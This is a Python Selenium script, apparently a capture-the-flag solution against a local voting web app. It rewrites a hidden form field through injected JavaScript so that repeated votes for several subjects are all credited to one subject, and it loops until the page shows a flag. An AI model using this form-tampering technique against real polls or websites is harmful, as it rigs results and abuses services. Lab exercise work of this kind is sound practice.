
#-*- coding: utf-8 -*-
from urllib.request import urlopen, Request
import requests
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
#                                                                                                                   /!\
#IMPORTANT NE PAS OUBLIER DE RAJOUTER geckodriver pour firefox DANS UN REP DE $PATH SINON LE PROGRAMME NE S EXECUTERA PAS !
#                                                                                                                   /!\

class Survey:

    def __init__(self):
        self.select_decremente = ".getElementsByTagName('td')[0].getElementsByTagName('form')[0].getElementsByTagName('select')[0].options[0].selected = true"
        self.select_incremente = ".getElementsByTagName('td')[0].getElementsByTagName('form')[0].getElementsByTagName('select')[0].options[9].selected = true"
        self.actualize_index()

    def wait(self):
        time.sleep(0.08)
    
    def actualize_index(self):
        Engine.browser.execute_script("document.getElementsByTagName('caption')[0].getElementsByTagName('p')[0].innerHTML = 'bruteforcing in progress ... (" + str(Engine.index) + "/"+ str(Engine.max_index) + ")'")

    def decremente(self, target_index_sujet):
        try:
            self.actualize_index()
            if target_index_sujet > -1:
                Engine.browser.execute_script("document.getElementsByTagName('tbody')[0].getElementsByTagName('tr')[" + str(self.index_html) +"].getElementsByTagName('td')[0].getElementsByTagName('form')[0].getElementsByTagName('input')[0].setAttribute('value', " + str(target_index_sujet) + ")")
            Engine.browser.execute_script(self.req_select + self.select_decremente)
            Engine.browser.execute_script(self.req_select + ".getElementsByTagName('td')[0].getElementsByTagName('form')[0].submit()")
            self.wait()
        except:
            self.wait()
            self.decremente(target_index_sujet)

    def incremente(self, target_index_sujet):
        try:
            self.actualize_index()
            if target_index_sujet > -1:
                Engine.browser.execute_script("document.getElementsByTagName('tbody')[0].getElementsByTagName('tr')[" + str(self.index_html) +"].getElementsByTagName('td')[0].getElementsByTagName('form')[0].getElementsByTagName('input')[0].setAttribute('value', " + str(target_index_sujet) + ")")
            Engine.browser.execute_script(self.req_select + self.select_incremente)
            Engine.browser.execute_script(self.req_select + ".getElementsByTagName('td')[0].getElementsByTagName('form')[0].submit()")
            self.wait()
        except:
            self.wait()
            self.incremente(target_index_sujet)

class Subject(Survey):
    def __init__(self, values):
        Survey.__init__(self)
        #print(values)
        self.average = values['average']
        self.index_html = int(values['sujet_value']) - 1
        self.index_sujet = int(values['sujet_value'])
        self.nb_votes = values['nb_votes']
        self.req_select= "document.getElementsByTagName('tbody')[0].getElementsByTagName('tr')[" + str(self.index_html) +"]"
    
    def actualize_subjet(self, values):
        self.average = values['average']
        self.index_html = int(values['sujet_value']) - 1
        self.index_sujet = int(values['sujet_value'])
        self.nb_votes = values['nb_votes']

class Engine:
    index = 0
    max_index = 0
    browser = webdriver.Firefox()
    def __init__(self, max_i):
        Engine.browser.get('http://192.168.0.17:8080/')
        time.sleep(1)
        Engine.browser.execute_script("document.getElementById('nav').getElementsByTagName('ul')[0].getElementsByTagName('li')[1].getElementsByTagName('a')[0].style.border='thick solid white'")
        time.sleep(1)
        time.sleep(1)
        Engine.max_index = max_i
        Engine.browser.execute_script("document.getElementById('nav').getElementsByTagName('ul')[0].getElementsByTagName('li')[1].getElementsByTagName('a')[0].click()")
        time.sleep(1)
        self.max_average = 0.0
        self.subject={}
        for key, value in self.get_average(Engine.browser.page_source).items():
            print(key)
            if float(self.max_average) < float(value['average']):
                self.max_average = value['average']
            self.subject[key]=Subject(value)
        print(str(self.max_average))
        time.sleep(10)
        self.brute_force_zaz()

    def actualize_all_subjets(self):
        values = self.get_average(Engine.browser.page_source).items()
        for key, value in values:
            self.subject[key].actualize_subjet(value)
        print(self.subject['zaz'].nb_votes)

    def check_flag(self, browser):
        sc = Engine.browser.page_source.lower()
        if sc.find("flag") > -1:
            print("FLAG IS HERE !")
            while 1 == 1:
                pass
        else:
            pass
            #print("No FlaG !")

    def get_average(self, page_source):
        res = {}
        soup = BeautifulSoup(page_source, features="html.parser")
        for form in soup.find_all('tr', attrs={"bgcolor":"Silver"}):
            name = form.find_all("td")[2].string.lower()
            sujet_value = form.find("input").get('value')
            average = form.find_all("td")[1].string
            nb_votes = form.find_all("td")[3].string
            res[name.strip()]={"average":average.strip(), "sujet_value":sujet_value, "nb_votes":nb_votes.strip()}
        return res

    def brute_force_zaz(self):
        #while Engine.index < Engine.max_index:
        while True:
            self.subject['laurie'].incremente(self.subject['zaz'].index_sujet)
            try:
                self.check_flag(Engine.browser)
                self.actualize_all_subjets()
            except:
                time.sleep(0.5)
                self.check_flag(Engine.browser)
                self.actualize_all_subjets()
            self.subject['mathieu'].incremente(self.subject['zaz'].index_sujet)
            try:
                self.check_flag(Engine.browser)
                self.actualize_all_subjets()
            except:
                time.sleep(0.5)
                self.check_flag(Engine.browser)
                self.actualize_all_subjets()
            self.subject['thor'].incremente(self.subject['zaz'].index_sujet)
            try:
                self.check_flag(Engine.browser)
                self.actualize_all_subjets()
            except:
                time.sleep(0.5)
                self.check_flag(Engine.browser)
                self.actualize_all_subjets()
            self.subject['ly'].incremente(self.subject['zaz'].index_sujet)
            try:
                self.check_flag(Engine.browser)
                self.actualize_all_subjets()
            except:
                time.sleep(0.5)
                self.check_flag(Engine.browser)
                self.actualize_all_subjets()
            self.subject['zaz'].incremente(self.subject['zaz'].index_sujet)
            try:
                self.check_flag(Engine.browser)
                self.actualize_all_subjets()
            except:
                time.sleep(0.5)
                self.check_flag(Engine.browser)
                self.actualize_all_subjets()
            Engine.index +=1
        
        Engine.browser.quit()



engine = Engine(1222)



time.sleep(10)
